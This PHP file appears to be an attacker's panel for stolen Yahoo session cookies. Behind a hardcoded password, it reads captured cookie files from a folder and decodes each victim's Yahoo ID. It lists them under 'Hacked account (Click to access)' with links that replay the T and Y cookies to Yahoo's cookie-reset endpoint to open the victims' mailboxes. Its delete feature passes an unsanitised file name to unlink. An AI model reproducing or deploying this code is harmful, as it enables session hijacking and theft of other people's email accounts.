<?php
$pass = "password";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD cookiesTML 1.0 Transitional//EN" "http://www.w3.org/TR/cookiestml1/DTD/cookiestml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/cookiestml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title id=xx>Yahoo</title>
<link rel="stylesheet" href="s.css" />
<script type="text/javascript" src="j.js"></script><style type="text/css">
<!--
body {
	background-color: white;
}
-->
</style>
<style type=text/css>
#xx{font-family:"Times New Roman" size:30px}
</style>

</head>
<body>
<!---

 --->
<div id="header" class="header">

	<td align="left">
	  <table cellpadding="0" cellspacing="0" border="0" width="100%" align="center">
	    <tr align="left">
	      <td width="50%">&nbsp;</td>
	      <td width="50%"> <p align="right"><a href="?"><span class="links"> Refresh | </span></a><a href="?logout=1"><span class="links"> LogOut </span></a>
          </p></td>
        </tr>
      </table>
  </td>
</td>
</div>
<br />
<br />
<br />



<br />
<br />
<br />



<div id="wrapper">

  <table cellpadding="0" cellspacing="0" border="0" class="sortable" id="sorter">
    <tr>
      <th width="162"><p><font color="red" >Hacked account (Click to access) </font></p></th>
      <th width="170"><p><font color="red" >Date</font></p></th>
      
      <th width="77"><p><font color="red" >Delete</font></p></th>
  </tr>
  <?php
   if($_GET['logout'] == 1) {
  echo "<script>document.cookie ='pass=; path=/'</script>";
  echo "<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=?\">";
   }

  if(isset($_POST["pass"])) {
echo "<script>document.cookie ='pass=".$_POST['pass']."; path=/'</script>";
echo "<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=\">";
				 }
if($_COOKIE['pass'] != $pass) {


        echo '</table></div><div align="center"><b>Enter the password (I hope javascript is on): </b><p><form method="post">' .
             '<input type="password" name="pass"> <input type="submit" name="check" value="Login">' .
             '</form> </div>';
          exit(0);
}



 if($_GET['del']) {
        @unlink("./cookies/".$_GET['del']);
        			}

if ($handle = opendir('./cookies/')) {
    while ($file = readdir($handle)) {
        if ($file != "." && $file != ".." && $file != "index.html") {



$fcookie = "./cookies/".$file;
$fh = fopen($fcookie, 'r');
$cookie = fread($fh, filesize($fcookie));

	$T = explode("T=", $cookie); $T = $T[1];
	$T = explode(";", $T); $T = $T[0];

	$Y = explode("Y=", $cookie); $Y = $Y[1];
	$Y = explode(";", $Y); $Y = $Y[0];

	$yid = explode("l=", $Y); $yid = $yid[1];
	$yid = explode("/o", $yid); $yid = $yid[0];

	$str1 = "0123456789abcdefghijklmnopqrstuvwxyz-+._@";
	$str2 = "abcdefghijklmnopqrstuvwxyz0123456789-+._@";
	$id = ""; for($i = 0; $i < strlen($yid); $i++) $id .= $str2{strpos($str1, $yid{$i})};

	$p = substr($Y, strpos($Y, "p=") + 2, 7);
	
	$date = date ("M d Y H:i:s", filemtime("./cookies/".$file));

	$lang = explode("lg=", $Y); $lang = $lang[1];
	$lang = explode("&", $lang); $lang = $lang[0];


	$sr = array(array(";", "&", "="), array(null, "%26", "%3D"));
	$y = "Y%3D" . str_replace($sr[0], $sr[1], $Y);
	$t = "T%3D" . str_replace($sr[0], $sr[1], $T);

echo "<tr><td><a  href=\"http://msg.edit.yahoo.com/config/reset_cookies?.y=".$y."&.t=".$t."&.done=http%3A//us.mg1.mail.yahoo.com/ym/login%3Fymv%3D0\" target=\"_blank\"><b><font color=white size= 5px> ".$id."</font></b></a></td><td>";
echo $date."</td><td>";

echo "<a href=\"?del=".$file."\">Delete it</a></td></tr>";

}
}
    closedir($handle);
}


?>

		</tr>

	</table>
</div>
<script type="text/javascript">
var sorter=new table.sorter("sorter");
sorter.init("sorter",1);
</script>

</body>
</html>